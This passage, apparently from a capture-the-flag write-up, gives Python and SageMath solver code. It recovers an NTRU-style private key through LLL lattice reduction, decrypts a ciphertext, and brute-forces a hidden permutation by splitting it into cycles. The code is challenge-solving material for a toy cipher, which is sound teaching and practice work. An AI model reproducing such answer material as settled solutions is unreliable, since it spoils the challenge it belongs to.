class="number">1</span>])</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">						<span class="keyword">else</span>:</span><br><span class="line">							Chain.append(chain)</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> Chain</span><br><span class="line"></span><br><span class="line">Chain = find_Chain(P2)</span><br><span class="line"><span class="built_in">print</span>(Chain)</span><br><span class="line">LEN = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Chain:</span><br><span class="line">    LEN.append(<span class="built_in">len</span>(line))</span><br><span class="line"></span><br><span class="line">LEN = <span class="built_in">sorted</span>(LEN)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(LEN)</span><br></pre></td></tr></table></figure>
<p>这样可以找到其中所有的环<br>再根据单环唯一确定 分裂出的双环有len种可能 嵌套循环枚举即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">			self.size = data</span><br><span class="line">			self._<span class="built_in">list</span> = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.size)]</span><br><span class="line">			self._initialize()			</span><br><span class="line">		<span class="keyword">elif</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">			self._<span class="built_in">list</span> = data</span><br><span class="line">			self.size = <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">		<span class="keyword">return</span> P(self._iterList(self.getList(),other.getList()))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, other</span>):</span><br><span class="line">		tempList = self._<span class="built_in">list</span></span><br><span class="line">		<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,other):</span><br><span class="line">			tempList = self._iterList(tempList, tempList)</span><br><span class="line">		<span class="keyword">return</span> P(tempList)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">getList</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> self._<span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_initialize</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			random.shuffle(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_iterList</span>(<span class="params">self, List1,List2</span>):</span><br><span class="line">		new_list = []</span><br><span class="line">		<span class="keyword">for</span> elem <span class="keyword">in</span> List1:</span><br><span class="line">			new_list.append(List2[elem - <span class="number">1</span>])</span><br><span class="line">		<span class="keyword">return</span> new_list</span><br><span class="line">q,h = (<span class="number">18172777775303192159727657832771688633216215598877965158949208820296023901084764760222881725262986702478735713462424007788959106272018399708244805316198640706589775789778454299532286932532522325791791312289833643271330941006206604894333175027113622330874626579800679513666624938603337561309816936129926352661091319564303604867093095700819543458178063985869752612663625872468653351930763784372987474747809415652595112648835928004343413910248386752899307068129610089712815257479121368111201632430687614657790581254030567845143865728745079851692195657361359959987504557281840928862881924309178036648485188421874327022341</span>, <span class="number">392638098592460228418508462226385074690422702429214284385732305774317959159895775092251586043956914155602546821559652111400517952111932579557319610857122515237088379905875982863782386657213421074126519458271560586678974481499715849371311979995450766948182818105567819897007307737370051632369390705725712223883589110699340619034611462216676501782567065261228166297471411589579035544131060706331012337024260046692910523900152236991203944000276133732456285962825434272960749340504092014446362862600803570698206213069473248298100863523331832957430305801141935737006263947843411592717969844892834332104365594346376118846</span>)</span><br><span class="line">c=<span class="number">4605640253217003331334964510174592254013178259349707648547335080743845433538772185582533054930473399495034133342299169373655297635370654237814250924077096784419954824350471683280656146814012837777204413608581553756866045890045788846665715321962704221105416079118007959490372975054302058194463432668018727266982561600329852084442818715440190956213811944269576719501924787366260795121132011879061730892865163591549129768412164655406373350666250339077746317309673325358941772202710386313434421388779073207650619564862431076222163014501544922959835509589742031678624743915535537547452120771609556012990490607104696154771</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># M = Matrix(ZZ,2,2)</span></span><br><span class="line"><span class="comment"># M[0,0] = q</span></span><br><span class="line"><span class="comment"># M[0,1] = 0</span></span><br><span class="line"><span class="comment"># M[1,0] = h</span></span><br><span class="line"><span class="comment"># M[1,1] = 1</span></span><br><span class="line"><span class="comment"># Ge = M.LLL()</span></span><br><span class="line"><span class="comment"># for i in Ge:</span></span><br><span class="line"><span class="comment">#     g = int(abs(int(i[0])))</span></span><br><span class="line"><span class="comment">#     f = int(abs(int(i[-1])))</span></span><br><span class="line"><span class="comment">#     if f.bit_length()&gt;=1000:</span></span><br><span class="line"><span class="comment">#         print(f&#x27;g= &#123;g&#125;\nf= &#123;f&#125;&#x27;)</span></span><br><span class="line">g= <span class="number">80543133918404127488886301361326962793877182221425816412488158480855679387656522509067598512536004160200624450488501194899256437338964914229878803213278892167375927469338861409899138503409679804107844511855116009860285942703093653856978725198914922514759932610039646534971856735780113276875287001841258831367</span></span><br><span class="line">f= <span class="number">32114304664198200626949886557688567679378682689751764347873070091968817850723916157318846285817806084079915102989056457680818558130765168139779429885473027282918240513106424858891869095107110954431130817704525309921431164907347496920955065921260371828842317536589144089446549194267607829948059792467278739234</span></span><br><span class="line"></span><br><span class="line">mul=[<span class="number">114</span>, <span class="number">189</span>, <span class="number">92</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">161</span>, <span class="number">202</span>, <span class="number">250</span>, <span class="number">131</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">226</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">208</span>, <span class="number">195</span>, <span class="number">216</span>, <span class="number">141</span>, <span class="number">116</span>, <span class="number">167</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">158</span>, <span class="number">178</span>, <span class="number">197</span>, <span class="number">4</span>, <span class="number">187</span>, <span class="number">27</span>, <span class="number">200</span>, <span class="number">144</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">154</span>, <span class="number">86</span>, <span class="number">249</span>, <span class="number">93</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">40</span>, <span class="number">225</span>, <span class="number">38</span>, <span class="number">98</span>, <span class="number">186</span>, <span class="number">169</span>, <span class="number">64</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">183</span>, <span class="number">43</span>, <span class="number">201</span>, <span class="number">198</span>, <span class="number">242</span>, <span class="number">135</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">244</span>, <span class="number">120</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">148</span>, <span class="number">142</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">18</span>, <span class="number">170</span>, <span class="number">60</span>, <span class="number">130</span>, <span class="number">247</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">254</span>, <span class="number">70</span>, <span class="number">191</span>, <span class="number">210</span>, <span class="number">176</span>, <span class="number">145</span>, <span class="number">217</span>, <span class="number">82</span>, <span class="number">229</span>, <span class="number">125</span>, <span class="number">193</span>, <span class="number">155</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">75</span>, <span class="number">109</span>, <span class="number">238</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">163</span>, <span class="number">233</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">143</span>, <span class="number">234</span>, <span class="number">239</span>, <span class="number">59</span>, <span class="number">240</span>, <span class="number">209</span>, <span class="number">42</span>, <span class="number">205</span>, <span class="number">230</span>, <span class="number">253</span>, <span class="number">203</span>, <span class="number">219</span>, <span class="number">23</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">94</span>, <span class="number">85</span>, <span class="number">62</span>, <span class="number">172</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">100</span>, <span class="number">256</span>, <span class="number">196</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">206</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">246</span>, <span class="number">237</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">184</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">22</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">190</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">115</span>, <span class="number">251</span>, <span class="number">77</span>, <span class="number">214</span>, <span class="number">122</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">241</span>, <span class="number">224</span>, <span class="number">3</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">175</span>, <span class="number">194</span>, <span class="number">138</span>, <span class="number">179</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">156</span>, <span class="number">117</span>, <span class="number">58</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">180</span>, <span class="number">72</span>, <span class="number">123</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">71</span>, <span class="number">204</span>, <span class="number">39</span>, <span class="number">149</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">173</span>, <span class="number">139</span>, <span class="number">146</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">220</span>, <span class="number">79</span>, <span class="number">66</span>, <span class="number">57</span>, <span class="number">127</span>, <span class="number">243</span>, <span class="number">188</span>, <span class="number">165</span>, <span class="number">47</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">30</span>, <span class="number">177</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">207</span>, <span class="number">153</span>, <span class="number">28</span>, <span class="number">132</span>, <span class="number">168</span>, <span class="number">84</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">108</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">121</span>, <span class="number">128</span>, <span class="number">91</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">152</span>]</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = ((c*f)%q)*modinv(f,g)%g</span><br><span class="line">msg = m%g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P2 = [<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">    P2[i] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_Chain</span>(<span class="params">P2</span>):</span><br><span class="line">	Chain = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):			</span><br><span class="line">		head = i</span><br><span class="line">		chain = [head]</span><br><span class="line">		c = P2[head]</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">			chain.append(c)</span><br><span class="line">			c = P2[c]</span><br><span class="line">			<span class="keyword">if</span> c == head:				</span><br><span class="line">				<span class="keyword">if</span> chain <span class="keyword">not</span> <span class="keyword">in</span> Chain:	</span><br><span class="line">					lag = <span class="number">1</span></span><br><span class="line">					<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Chain)):		</span><br><span class="line">						<span class="keyword">for</span> l <span class="keyword">in</span> chain:				</span><br><span class="line">							<span class="keyword">if</span> l <span class="keyword">in</span> Chain[k]:</span><br><span class="line">								lag = <span class="number">0</span></span><br><span class="line">								<span class="keyword">break</span></span><br><span class="line">					<span class="keyword">if</span> lag == <span class="number">1</span>:</span><br><span class="line">						<span class="keyword">if</span> <span class="built_in">len</span>(chain) == <span class="number">2</span>:			</span><br><span class="line">							Chain.append(chain[:-<span class="number">1</span>])</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">						<span class="keyword">else</span>:</span><br><span class="line">							Chain.append(chain)</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> Chain</span><br><span class="line"></span><br><span class="line">Chain = find_Chain(P2)</span><br><span class="line"><span class="built_in">print</span>(Chain)</span><br><span class="line">LEN = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Chain:</span><br><span class="line">    LEN.append(<span class="built_in">len</span>(line))</span><br><span class="line"></span><br><span class="line">LEN = <span class="built_in">sorted</span>(LEN)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(LEN)</span><br><span class="line"></span><br><span class="line">chain64_1 = [<span class="number">0</span>, <span class="number">81</span>, <span class="number">136</span>, <span class="number">63</span>, <span class="number">11</span>, <span class="number">151</span>, <span class="number">65</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">227</span>, <span class="number">76</span>, <span class="number">244</span>, <span class="number">212</span>, <span class="number">139</span>, <span class="number">201</span>, <span class="number">91</span>, <span class="number">15</span>, <span class="number">135</span>, <span class="number">20</span>, <span class="number">224</span>, <span class="number">46</span>, <span class="number">164</span>, <span class="number">42</span>, <span class="number">74</span>, <span class="number">167</span>, <span class="number">219</span>, <span class="number">62</span>, <span class="number">189</span>, <span class="number">111</span>, <span class="number">241</span>, <span class="number">211</span>, <span class="number">10</span>, <span class="number">170</span>, <span class="number">215</span>, <span class="number">223</span>, <span class="number">246</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">207</span>, <span class="number">9</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">60</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">156</span>, <span class="number">195</span>, <span class="number">206</span>, <span class="number">132</span>, <span class="number">97</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">98</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">130</span>, <span class="number">51</span>, <span class="number">58</span>, <span class="number">177</span>, <span class="number">240</span>]</span><br><span class="line">chain64_2 = [<span class="number">1</span>, <span class="number">236</span>, <span class="number">50</span>, <span class="number">172</span>, <span class="number">138</span>, <span class="number">14</span>, <span class="number">169</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">197</span>, <span class="number">181</span>, <span class="number">159</span>, <span class="number">32</span>, <span class="number">55</span>, <span class="number">141</span>, <span class="number">54</span>, <span class="number">30</span>, <span class="number">221</span>, <span class="number">57</span>, <span class="number">226</span>, <span class="number">43</span>, <span class="number">37</span>, <span class="number">26</span>, <span class="number">254</span>, <span class="number">203</span>, <span class="number">193</span>, <span class="number">38</span>, <span class="number">71</span>, <span class="number">27</span>, <span class="number">59</span>, <span class="number">225</span>, <span class="number">153</span>, <span class="number">106</span>, <span class="number">149</span>, <span class="number">214</span>, <span class="number">84</span>, <span class="number">110</span>, <span class="number">129</span>, <span class="number">239</span>, <span class="number">137</span>, <span class="number">216</span>, <span class="number">229</span>, <span class="number">100</span>, <span class="number">150</span>, <span class="number">24</span>, <span class="number">73</span>, <span class="number">235</span>, <span class="number">40</span>, <span class="number">200</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">120</span>, <span class="number">178</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">251</span>, <span class="number">220</span>, <span class="number">45</span>, <span class="number">176</span>, <span class="number">238</span>, <span class="number">154</span>, <span class="number">194</span>]</span><br><span class="line">chain29_1 = [<span class="number">4</span>, <span class="number">29</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">64</span>, <span class="number">102</span>, <span class="number">147</span>, <span class="number">77</span>, <span class="number">92</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">56</span>, <span class="number">162</span>, <span class="number">140</span>, <span class="number">205</span>, <span class="number">23</span>, <span class="number">124</span>, <span class="number">96</span>, <span class="number">232</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">123</span>, <span class="number">234</span>, <span class="number">252</span>, <span class="number">112</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">93</span>]</span><br><span class="line">chain29_2 = [<span class="number">7</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">79</span>, <span class="number">121</span>, <span class="number">204</span>, <span class="number">99</span>, <span class="number">187</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">142</span>, <span class="number">243</span>, <span class="number">202</span>, <span class="number">182</span>, <span class="number">89</span>, <span class="number">174</span>, <span class="number">145</span>, <span class="number">52</span>, <span class="number">209</span>, <span class="number">233</span>, <span class="number">242</span>, <span class="number">19</span>, <span class="number">158</span>, <span class="number">173</span>, <span class="number">94</span>, <span class="number">217</span>, <span class="number">133</span>, <span class="number">85</span>, <span class="number">17</span>]</span><br><span class="line">chain20_1 = [<span class="number">3</span>, <span class="number">82</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">185</span>, <span class="number">180</span>, <span class="number">12</span>, <span class="number">192</span>, <span class="number">248</span>, <span class="number">108</span>, <span class="number">166</span>, <span class="number">210</span>, <span class="number">28</span>, <span class="number">186</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">165</span>, <span class="number">184</span>, <span class="number">122</span>, <span class="number">8</span>]</span><br><span class="line">chain20_2 = [<span class="number">5</span>, <span class="number">199</span>, <span class="number">61</span>, <span class="number">255</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">114</span>, <span class="number">41</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">35</span>, <span class="number">228</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">107</span>, <span class="number">175</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">21</span>]</span><br><span class="line">chain9_1 = [<span class="number">39</span>, <span class="number">196</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">128</span>, <span class="number">75</span>, <span class="number">208</span>, <span class="number">116</span>, <span class="number">231</span>]</span><br><span class="line">chain9_2 = [<span class="number">68</span>, <span class="number">218</span>, <span class="number">188</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">183</span>, <span class="number">222</span>, <span class="number">230</span>]</span><br><span class="line">chain4_1 = [<span class="number">22</span>, <span class="number">179</span>, <span class="number">198</span>, <span class="number">144</span>]</span><br><span class="line">chain4_2 = [<span class="number">49</span>, <span class="number">171</span>, <span class="number">250</span>, <span class="number">118</span>]</span><br><span class="line">chain3 = [<span class="number">87</span>, <span class="number">105</span>, <span class="number">247</span>]</span><br><span class="line">chain1 = [<span class="number">191</span>]</span><br><span class="line"></span><br><span class="line">dictionary = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">singlering</span>(<span class="params">chain</span>):</span><br><span class="line">    new = [<span class="number">0</span>]*<span class="built_in">len</span>(chain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chain)):</span><br><span class="line">        new[i*<span class="number">2</span>%<span class="built_in">len</span>(chain)] = chain[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chain)):</span><br><span class="line">        dictionary[new[i]] = new[(i+<span class="number">1</span>)%<span class="built_in">len</span>(chain)] <span class="comment"># map</span></span><br><span class="line"></span><br><span class="line">singlering(chain1)</span><br><span class="line">singlering(chain3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 大循环嵌套</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> trange(<span class="number">64</span>):									</span><br><span class="line">    ring_128 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            ring_128[j] = chain64_1[j//<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ring_128[j] = chain64_2[(j//<span class="number">2</span>+i1)%<span class="number">64</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        dictionary[ring_128[j]] = ring_128[(j+<span class="number">1</span>)%<span class="number">128</span>]	</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):								</span><br><span class="line">        ring_58 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>)]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">            <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">                ring_58[j] = chain29_1[j//<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ring_58[j] = chain29_2[(j//<span class="number">2</span>+i2)%<span class="number">29</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">            dictionary[ring_58[j]] = ring_58[(j+<span class="number">1</span>)%<span class="number">58</span>]	</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):							</span><br><span class="line">            ring_40 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">                <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                    ring_40[j] = 